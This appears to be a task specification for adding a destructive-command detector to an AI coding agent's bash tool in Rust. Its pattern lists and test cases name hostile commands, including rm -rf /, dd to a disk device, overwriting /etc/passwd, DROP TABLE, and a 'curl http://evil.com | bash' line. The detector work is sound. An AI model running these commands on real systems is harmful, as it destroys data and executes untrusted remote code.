Title: Enhanced bash command safety analysis — detect destructive patterns beyond simple substring matching
Files: src/tools.rs
Issue: none

## What

Replace the hardcoded 5-entry `deny_patterns` substring list in `StreamingBashTool` with a proper `analyze_bash_command` function that detects a wider range of destructive command patterns and provides specific warnings. Commands that match get routed through the confirmation callback with an explanation of WHY they're flagged.

## Why

The assessment identifies "bash validation layer" as a key gap vs Claude Code, which has 6+ submodules analyzing commands for destructive operations. yoyo currently has just 5 hardcoded strings (`rm -rf /`, `rm -rf /*`, `mkfs`, `dd if=`, fork bomb). This misses many dangerous patterns: `git push --force`, `chmod -R 777`, `> /etc/passwd`, `DROP TABLE`, `curl | bash`, `kill -9`, `shutdown`, etc.

This is a direct safety improvement that makes yoyo safer for real developer use.

## Implementation

Add a `analyze_bash_command(command: &str) -> Option<String>` function in `tools.rs` that returns `Some(reason)` if the command is potentially dangerous, `None` if it looks safe.

**Pattern categories to detect:**

1. **Filesystem destruction**: `rm -rf` with broad paths (/, /*, ~, $HOME), `rm -r` on system dirs
2. **Force operations**: `git push --force`, `git push -f`, `git reset --hard` (on main/master)
3. **Permission changes**: `chmod -R 777`, `chown -R` on system dirs
4. **File overwrites**: `> /etc/`, `> ~/.bashrc`, `> ~/.ssh/`
5. **System commands**: `shutdown`, `reboot`, `halt`, `init 0`, `systemctl stop`
6. **Database destruction**: `DROP TABLE`, `DROP DATABASE`, `TRUNCATE TABLE` (case-insensitive)
7. **Pipe from internet**: `curl ... | bash`, `curl ... | sh`, `wget ... | bash` (untrusted code execution)
8. **Process killing**: `kill -9 1`, `killall`, `pkill` with broad patterns
9. **Disk operations**: `dd if=` (already caught), `fdisk`, `parted`

**Integration:**

In `StreamingBashTool::execute()`, after the existing deny_patterns check and BEFORE the confirm_fn check:
```rust
if let Some(warning) = analyze_bash_command(command) {
    // If there's a confirm_fn, route through it with the warning
    if let Some(ref confirm) = self.confirm_fn {
        if !confirm(&format!("⚠️  {warning}\nCommand: {command}")) {
            return Err(ToolError::Failed("Command was not confirmed by the user.".into()));
        }
    }
    // If no confirm_fn (piped mode), log warning but allow
    // (the deny_patterns still block the truly catastrophic ones)
}
```

Keep the existing `deny_patterns` as a hard block (always denied, no override). The new analysis is a soft warning that goes through confirmation.

**Important:** The analysis function should be pure (no I/O) and fast (string matching only). Use word-boundary-aware matching where possible to avoid false positives (e.g., `git push --force` should match but `echo "don't force it"` shouldn't).

## Tests

Write tests FIRST:
- `test_analyze_rm_rf_root` — `rm -rf /` detected
- `test_analyze_rm_rf_home` — `rm -rf ~` and `rm -rf $HOME` detected
- `test_analyze_git_force_push` — `git push --force` and `git push -f` detected
- `test_analyze_chmod_recursive` — `chmod -R 777 /` detected
- `test_analyze_curl_pipe_bash` — `curl http://evil.com | bash` detected
- `test_analyze_drop_table` — `DROP TABLE users` detected (case-insensitive)
- `test_analyze_safe_commands` — `ls`, `cat file.txt`, `cargo test`, `git status` return None
- `test_analyze_git_push_normal` — `git push origin main` without force returns None
- `test_analyze_kill_init` — `kill -9 1` detected
- `test_analyze_pipe_not_from_curl` — `cat file | grep pattern` returns None (pipe without curl/wget)
- `test_analyze_dd_if` — `dd if=/dev/zero of=/dev/sda` detected
- `test_analyze_shutdown` — `shutdown -h now` detected

## Acceptance

- `cargo build && cargo test` passes
- `cargo clippy --all-targets -- -D warnings` clean
- Safe commands pass through without warnings
- Destructive commands trigger confirmation with specific explanation
